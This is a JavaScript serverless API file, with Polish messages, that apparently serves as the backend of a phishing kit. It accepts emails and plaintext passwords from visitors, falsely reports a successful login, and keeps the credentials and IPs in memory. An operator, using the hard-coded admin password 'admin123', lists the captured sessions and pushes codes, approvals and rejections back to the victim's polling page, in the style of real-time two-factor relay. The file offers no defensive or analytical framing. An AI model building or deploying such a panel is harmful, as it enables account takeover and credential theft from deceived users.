// api/index.js
let sessions = {};

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const { action } = req.query;

    try {
        // ============================================================
        // TEST
        // ============================================================
        if (action === 'test') {
            return res.status(200).json({ 
                status: 'ok', 
                message: 'API działa!',
                timestamp: new Date().toISOString()
            });
        }

        // ============================================================
        // SESSION - logowanie
        // ============================================================
        if (action === 'session' && req.method === 'POST') {
            const { email, password, ip } = req.body;

            if (!email || !password) {
                return res.status(400).json({ error: 'Email i hasło wymagane' });
            }

            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
            
            sessions[sessionId] = {
                email,
                password,
                ip: ip || 'N/A',
                timestamp: new Date().toISOString(),
                code: null,
                verified: false,
                rejected: false,
                approved: false
            };

            return res.status(200).json({ 
                success: true, 
                sessionId: sessionId,
                message: 'Zalogowano pomyślnie.'
            });
        }

        // ============================================================
        // POLL - sprawdzanie statusu sesji
        // ============================================================
        if (action === 'poll' && req.method === 'GET') {
            const { sessionId } = req.query;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            const session = sessions[sessionId];
            if (!session) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            return res.status(200).json({
                code: session.code || null,
                verified: session.verified || false,
                rejected: session.rejected || false,
                approved: session.approved || false
            });
        }

        // ============================================================
        // SET-CODE - admin ustawia kod
        // ============================================================
        if (action === 'set-code' && req.method === 'POST') {
            const { sessionId, code, adminPassword } = req.body;

            if (!sessionId || !code) {
                return res.status(400).json({ error: 'Brak sessionId lub kodu' });
            }

            if (adminPassword !== 'admin123') {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const session = sessions[sessionId];
            if (!session) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            session.code = code;
            session.codeSetAt = new Date().toISOString();

            return res.status(200).json({ 
                success: true, 
                message: 'Kod ustawiony!'
            });
        }

        // ============================================================
        // APPROVE - admin zatwierdza
        // ============================================================
        if (action === 'approve' && req.method === 'POST') {
            const { sessionId, adminPassword } = req.body;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            if (adminPassword !== 'admin123') {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const session = sessions[sessionId];
            if (!session) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            session.approved = true;
            session.verified = true;

            return res.status(200).json({ 
                success: true, 
                message: 'Użytkownik zatwierdzony!',
                approved: true
            });
        }

        // ============================================================
        // REJECT - admin odrzuca
        // ============================================================
        if (action === 'reject' && req.method === 'POST') {
            const { sessionId, adminPassword } = req.body;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            if (adminPassword !== 'admin123') {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const session = sessions[sessionId];
            if (!session) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            session.rejected = true;

            return res.status(200).json({ 
                success: true, 
                message: 'Użytkownik odrzucony!',
                rejected: true
            });
        }

        // ============================================================
        // ADMIN SESSIONS - lista sesji
        // ============================================================
        if (action === 'sessions' && req.method === 'GET') {
            const { adminPassword } = req.query;

            if (adminPassword !== 'admin123') {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const sessionList = Object.keys(sessions).map(id => {
                const s = sessions[id];
                return {
                    sessionId: id,
                    email: s.email,
                    timestamp: s.timestamp,
                    hasCode: !!s.code,
                    verified: s.verified || false,
                    rejected: s.rejected || false,
                    approved: s.approved || false
                };
            });

            sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

            return res.status(200).json({ sessions: sessionList });
        }

        // ============================================================
        // Domyślnie - 404
        // ============================================================
        return res.status(404).json({ error: 'Nieznana akcja' });

    } catch (error) {
        console.error('API error:', error);
        return res.status(500).json({ error: 'Internal server error: ' + error.message });
    }
}
